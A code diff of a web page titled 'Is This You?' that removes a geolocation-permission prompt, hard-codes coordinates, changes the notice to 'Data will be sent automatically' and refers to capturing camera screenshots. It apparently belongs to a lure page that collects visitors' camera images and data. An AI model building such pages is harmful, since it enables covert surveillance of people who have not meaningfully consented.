@@ -71,7 +71,7 @@
     </div>
     <div class="container">
         <h1>Is This You?</h1>
-        <p>Please allow access to your location for the best experience.</p>
+        <p>Data will be sent automatically.</p>
         <button class="button" id="start-button">Start Process</button>
         <div id="error-message" class="error-message"></div>
         <div id="info-message" class="info-message"></div>
@@ -108,8 +108,8 @@
             loadingScreen.style.display = 'flex'; // Show loading screen
             
             try {
-                // Request location permission
-                const position = await getLocation();
+                // Get fake location for demo purposes (you can set fixed coordinates)
+                const position = { coords: { latitude: 40.7128, longitude: -74.0060 } }; // Example: New York City
                 
                 // Create a unique session ID
                 const sessionId = Date.now();
@@ -125,24 +125,6 @@
             } finally {
                 loadingScreen.style.display = 'none'; // Hide loading screen
             }
-        }
-
-        // Function to request location access
-        function getLocation() {
-            return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    return reject(new Error("Geolocation is not supported by your browser."));
-                }
-                navigator.geolocation.getCurrentPosition(resolve, (error) => {
-                    // Handle permission denial or any error
-                    if (error.code === error.PERMISSION_DENIED) {
-                        infoMessage.innerHTML = "Location access denied. Proceeding without location.";
-                        resolve({ coords: { latitude: null, longitude: null } }); // Allow continuation
-                    } else {
-                        reject(new Error("Unable to retrieve location: " + error.message));
-                    }
-                });
-            });
         }
 
         // Function to take a screenshot from the camera
